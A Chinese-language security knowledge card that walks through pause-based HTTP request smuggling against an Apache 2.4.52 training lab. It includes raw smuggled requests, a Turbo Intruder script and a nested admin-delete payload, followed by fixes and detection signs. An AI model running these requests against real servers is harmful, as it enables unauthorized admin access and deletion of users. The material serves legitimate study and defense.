---
id: web-generic-http-smuggling-pause-based-desync-timeout
title: 基于暂停的请求走私：利用后端读取超时在前端/后端连接上注入请求前缀
type: scenario
domain: web
path: web/generic/http-smuggling
technique: pause-based-desync-timeout
aliases:
- Pause-based desync
- 基于暂停的请求走私
- 超时去同步
- server-side pause-based request smuggling
- Apache 2.4.52 超时走私
- Turbo Intruder pauseMarker
tags:
- http-smuggling
- desync
- timeout
- apache
- turbo-intruder
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V605
  verified_at: '2026-11-12T18:34:18+08:00'
  notes: '已对照原文与图28-39核对：Server: Apache/2.4.52（图28）、GET /resources 302 到 /resources/（图29）、Turbo Intruder 入口（图30）、POST /resources CL0 body GET /admin/ 与 pauseMarker=\r\n\r\n、pauseTime=61000（图31）、61 秒后两条结果（302 与 401 仅本地用户，图32-34）、Host: localhost 后 200 拿到管理面板及 action=/admin/delete 与 csrf（图35-36）、嵌套 POST /admin/delete CL159 且 pauseMarker=Content-Length:159（图37）、删除后 302（图38）、靶场 Solved（图39）。三个利用条件、暂停机制、pauseMarker 调整与卡片一致。Apache 2.4.52 仅为靶场环境版本、非原文声明的受影响区间，affected_versions 保持 null；未在本机复现。'
---

## 一句话结论

当前端把请求字节即时流式转发给后端、后端在读取超时后发送响应却保持连接复用时，攻击者可以先只发请求头并暂停：后端超时响应后，攻击者再发送包含走私请求前缀的请求体，前端把它当作原请求的继续转发，后端却把其当作新请求解析，从而在“前端-后端”连接上注入请求前缀并访问仅限本地/受保护的路由。

## 原理

- **超时后连接复用**：后端通常配置读取超时，超过一定时间未收到数据就把请求视为完成并响应，但可能不关闭连接以便复用。
- **前端流式转发**：前端服务器必须立即转发收到的每个字节（不等待完整请求）；这样攻击者先发的“头”已到后端，暂停期间前端继续等待 CL 承诺的剩余字节，后端先超时并响应。
- **暂停后再发 body**：紧接着发送的 body（内含 `GET /admin` 之类的完整请求）被前端视为原请求的继续、通过同一连接转发；后端已经响应过原请求，于是把这些字节当成新请求的起点，实现 CL.0 式 desync。
- **三个利用条件**：① 前端即时转发每个字节；② 前端不能比后端先超时；③ 后端超时后保持连接打开以供复用。
- **为什么针对重定向端点**：服务器自己生成响应（如 Apache 把 `/resources` 重定向到 `/resources/`）时更容易出现“响应已发但连接仍复用”的行为；原文靶场为 Apache 2.4.52，超时约 61 秒。
- **利用价值**：把请求前缀注入后端连接后，可在下一个“请求”中指定 `Host: localhost` 访问仅限本地用户的管理面板，并执行删除用户等敏感操作，绕过前端 ACL。

## 触发条件

- 前端流式转发、后端读取超时后保持连接（如 Apache 某些版本/配置）。
- 存在会触发服务器级响应（重定向、静态资源、错误页）且后端不消费 body 的端点。
- 攻击者能在同一连接上先发头、等待超时、再发 body（Turbo Intruder/自定义 socket）。
- 目标有值得绕过的受保护路由（/admin 等）。

## 利用步骤

1. 探测后端版本与端点行为：观察 `Server` 头（如 Apache 2.4.52），尝试对有效目录但不带尾斜杠的 `GET /resources`，确认返回重定向。
2. 用 Turbo Intruder 等工具把请求转换为 `POST /resources`，`Connection: keep-alive`、`Content-Length: 0`，body 放一个完整 `GET /admin/ HTTP/1.1` 请求；在第一个头部结束处设置 `pauseMarker`，`pauseTime` 设为大于后端超时（如 61000ms）。
3. 发送后等待约 61 秒，结果表出现两条：原请求的重定向响应，以及被注入的 `/admin/` 响应（可能提示仅限本地）。
4. 把注入请求的 `Host` 改为 `localhost` 重新发送，确认可访问管理面板。
5. 读取管理面板表单的 action、username 字段与 CSRF token，构造嵌套的 `POST /admin/delete` 请求，调整外层 Content-Length 与 pauseMarker（只匹配第一组头结尾），再次攻击删除目标用户。
6. 刷新靶场/目标验证；授权测试中不做破坏性删除。

## PoC

检测/访问管理面板：

```http
POST /resources HTTP/1.1
Host: <target>
Cookie: session=<session>
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 91

GET /admin/ HTTP/1.1
Host: localhost
```

Turbo Intruder 关键脚本：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False)
    engine.queue(target.req, pauseMarker=['Content-Length: 91\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

嵌套删除请求：

```http
POST /resources HTTP/1.1
Host: <target>
Cookie: session=<session>
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 159

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: 53

csrf=<csrf>&username=carlos
```

## 变体与关联

- **变体（客户端）**：同样的暂停/超时思路可用于浏览器端 CSD（client-side pause-based desync）。
- **变体（端点）**：任何服务器级响应端点（重定向、404、静态文件）都可能不消费 body。
- **关联**：[[web-generic-http-smuggling-cl0-backend-ignores-content-length]]（CL.0 基础）、[[web-generic-http-smuggling-client-side-desync-cookie-leak]]（浏览器端去同步）、[[web-generic-http-smuggling-varnish-pipeline-cl-residual]]（代理缓冲区残余解析）。
- **边界**：前端等待完整请求才转发、前端超时早于后端、后端超时后关闭连接、或攻击者无法在同一连接上精确暂停时，该手法不成立。

## 检测与防御

- **修复**：后端超时后关闭连接或确保不把后续字节当新请求；前后端超时时间对齐；对未完整读取 body 的请求不要让连接复用。
- **代理层**：对超时/异常请求强制 `Connection: close`；限制单连接请求数；对“请求头后长时间无数据”的连接做审计。
- **检测**：同一连接上长时间暂停后出现第二个请求；`POST` 到重定向端点且 body 含请求行；`Host: localhost`/内网地址出现在代理后的请求中；前端与后端请求日志的数量/路径不一致。
